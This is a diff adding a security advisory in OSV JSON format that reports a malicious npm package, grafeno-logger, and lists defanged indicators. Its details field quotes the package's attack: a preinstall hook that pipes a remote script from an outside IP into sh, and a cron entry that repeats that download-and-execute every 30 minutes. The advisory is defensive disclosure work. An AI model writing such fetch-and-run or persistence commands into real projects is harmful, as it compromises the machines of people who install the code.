@@ -1,0 +1,64 @@
+{
+  "schema_version": "1.6.0",
+  "id": "LWA-2026-11694",
+  "modified": "2026-08-28T22:49:15Z",
+  "published": "2026-08-28T22:49:01Z",
+  "summary": "Malicious code in grafeno-logger (npm)",
+  "details": "The preinstall hook of grafeno-logger@1.0.0 downloads and executes a remote shell script from 216[.]126[.]236[.]46/x.sh via `curl -s... | sh` using /bin/bash, then installs a cron job that re-runs the same download-and-execute every 30 minutes (`*/30 * * * * curl -s 216[.]126[.]236[.]46/x.sh|sh`). The package contains no legitimate logging code; its entire behaviour is the remote payload fetch and persistence.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "grafeno-logger",
+        "purl": "pkg:npm/grafeno-logger"
+      },
+      "versions": [
+        "1.0.0"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "name": "Embedded Malicious Code"
+          }
+        ]
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/grafeno-logger/v/1.0.0"
+    },
+    {
+      "type": "REPORT",
+      "url": "https://threatintel.leitwacht.eu/d/LWA-2026-11694"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Leitwacht",
+      "type": "FINDER",
+      "contact": [
+        "https://threatintel.leitwacht.eu"
+      ]
+    }
+  ],
+  "database_specific": {
+    "leitwacht": {
+      "category": "malware",
+      "first_seen_at": "2026-08-28T22:49:01Z",
+      "indicators_observed": {
+        "ip_observed": [
+          "216[.]126[.]236[.]46"
+        ],
+        "sha256": [
+          "55fe6abb2483ffb4385cae5947c16739a675fc3984fefc32d2e983567ed808cf"
+        ],
+        "url_observed": [
+          "hxxp://216[.]126[.]236[.]46/x[.]sh"
+        ]
+      }
+    }
+  }
+}
